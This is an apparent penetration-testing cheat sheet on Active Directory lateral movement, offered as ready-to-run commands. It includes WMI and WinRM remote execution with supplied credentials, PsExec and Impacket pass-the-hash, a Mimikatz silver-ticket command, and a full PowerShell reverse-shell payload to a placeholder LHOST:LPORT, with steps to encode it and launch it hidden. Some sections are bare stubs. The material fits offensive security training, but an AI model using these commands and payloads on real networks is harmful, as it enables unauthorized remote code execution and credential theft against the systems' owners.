---
sidebar_position: 1
title: Lateral Movement
---

# AD Lateral Movement

## WMI (Windows Management Instrumentation)

Requires credentials for a user in the local Administrators group on the target.

### wmic (CMD)

```powershell
wmic /node:$TARGET /user:$USER /password:$PASSWORD process call create "calc"
```

:::tip
Processes created through WMI run in session 0 (background), not the user's interactive desktop.
:::

### PowerShell CIM

```powershell
$username = '$USER';
$password = '$PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName $TARGET -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e <base64-encoded-reverse-shell>';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

### Encoding a Reverse Shell for WMI

Use Python to base64-encode the PowerShell payload:

```python
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
encoded = base64.b64encode(payload.encode('utf-16le')).decode()
print(encoded)
```

---

## WinRM

Uses WS-Management protocol over HTTP (port 5985) or HTTPS (port 5986). The target user must be in the Administrators or Remote Management Users group.

### winrs (CMD)

```powershell
winrs -r:$TARGET -u:$USER -p:$PASSWORD "cmd /c whoami"
winrs -r:$TARGET -u:$USER -p:$PASSWORD "powershell -nop -w hidden -e <base64-payload>"
```

### PowerShell Remoting

```powershell
$credential = New-Object System.Management.Automation.PSCredential $USER, (ConvertTo-SecureString $PASSWORD -AsPlaintext -Force)
New-PSSession -ComputerName $TARGET -Credential $credential
Enter-PSSession <session-id>
```

### Evil-WinRM (From Kali)

```bash
evil-winrm -i $TARGET -u $USER -p $PASSWORD
```

With hash:

```bash
evil-winrm -i $TARGET -u $USER -H $HASH
```

---

## PsExec

Part of SysInternals suite. Prerequisites:
1. User must be in the local Administrators group
2. The `ADMIN$` share must be available
3. File and Printer Sharing must be enabled

PsExec writes `psexesvc.exe` to `C:\Windows`, creates a service, and runs the command as a child process.

```powershell
.\PsExec64.exe -i \\$TARGET -u $DOMAIN\$USER -p $PASSWORD cmd
```

### Impacket PsExec (From Kali)

```bash
impacket-psexec $DOMAIN/$USER:$PASSWORD@$TARGET
```

With hash:

```bash
impacket-psexec -hashes 00000000000000000000000000000000:$HASH $USER@$TARGET
```

---

## Pass the Hash (PtH)

Authenticate using NTLM hash without knowing the plaintext password. Same prerequisites as PsExec (SMB port 445, File and Printer Sharing, ADMIN$ share, local admin rights).

```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:$HASH Administrator@$TARGET
```

:::tip
PtH works with local admin accounts and domain accounts that are members of the local Administrators group. The third prerequisite (ADMIN$) is key — without it, PtH tools can't deploy their service executables.
:::

---

## Overpass the Hash

Abuse an NTLM hash to obtain a full Kerberos TGT, then use it to authenticate to services that only accept Kerberos.

Uses an acquired NTLM hash to get a Kerberos TGT, allowing authentication to machines that only allow Kerberos.

---

## Pass the Ticket

Requires completing Overpass the Hash first to obtain a valid TGT.

---

## DCOM

Distributed Component Object Model — another lateral movement vector using COM objects over the network.

---

## Silver Tickets

Forge a service ticket using the SPN's password hash. Requires:
1. SPN password hash
2. Domain SID
3. Target SPN

```powershell
# Mimikatz
kerberos::golden /sid:<domain-SID> /domain:$DOMAIN /target:<target-host> /service:HTTP /rc4:$HASH /user:$USER /ptt
```

Verify the ticket:

```powershell
klist
```

---

## Golden Tickets

Requires compromising the `krbtgt` account hash (typically through DC Sync). Allows forging TGTs for any user in the domain.

---

## Shadow Copies

Domain controller volume shadow copies can contain the NTDS.dit database with all domain password hashes.
